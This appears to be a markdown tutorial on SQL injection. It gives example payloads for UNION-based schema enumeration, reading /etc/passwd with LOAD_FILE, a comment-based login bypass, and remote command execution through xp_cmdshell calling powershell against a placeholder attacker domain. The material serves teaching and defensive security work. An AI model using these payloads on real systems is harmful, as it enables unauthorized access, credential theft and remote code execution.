# SQL Injection

## Table of Contents

- [Data Exfiltration](#data-exfiltration)
- [Authentication Bypass](#authentication-bypass)
- [RCE](#rce)

## Data Exfiltration

### It is possible to access data without the appropriate permissions.

- Retrieving schema objects [^1]
    1. Query that fetches posts
        ```sql
        SELECT * FROM posts WHERE id = {user_input};
        ```
    2. Standard query
        ```sql
        SELECT * FROM posts WHERE id = 1;
        ```
        ```json
        {
          "id": 1,
          "title": "First Post",
          "content": "This is the content of the first post."
        }
        ```
    3. Manipulated query
        ```sql
        SELECT * FROM posts WHERE id = 1 UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema = 'database_name'
        ```
        ```json
        [
          {
            "id": 1,
            "title": "First Post",
            "content": "This is the content of the first post."
          },
          {
            "id": null,
            "title": "posts",
            "content": null
          },
          {
            "id": null,
            "title": "user_information",
            "content": null
          }
        ]
        ```

- Reading a file from the file system [^1]
    1. Query that fetches posts
        ```sql
        SELECT * FROM posts WHERE id = {user_input};
        ```
    2. Manipulating the query to read local files
        ```sql
        SELECT * FROM posts WHERE id = 1 UNION SELECT null, LOAD_FILE('/etc/passwd'),null;
        ```
        ```json
        [
          {
            "id": 1,
            "title": "First Post",
            "content": "This is the content of the first post."
          },
          {
            "id": null,
            "title": "root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000:user:/home/user:/bin/bash\n...",
            "content": null
          }
        ]
        ```

## Authentication Bypass

### The protection implemented in the service can be bypassed.

- Login bypass
    1. Query that validates credentials
        ```sql
        SELECT * FROM users WHERE id = '{user_input_id}' AND password = '{user_input_password}';
        ```

    2. Manipulated query
        ```sql
        SELECT * FROM users WHERE id = 'admin'-- AND password = '1';
        ```

## RCE

### Arbitrary commands can be executed remotely.

- Executing OS commands [^2]
    1. Query that fetches posts
        ```sql
        SELECT * FROM posts WHERE id = {user_input};
        ```
    2. Manipulated query
        ```sql
        SELECT * FROM posts WHERE id = 1; EXEC xp_cmdshell 'powershell -Command "Invoke-WebRequest -Uri https://[ATTACKER-DOMAIN]/"';
        ```

[^1]: Based on MySQL.
[^2]: Based on Microsoft SQL Server.
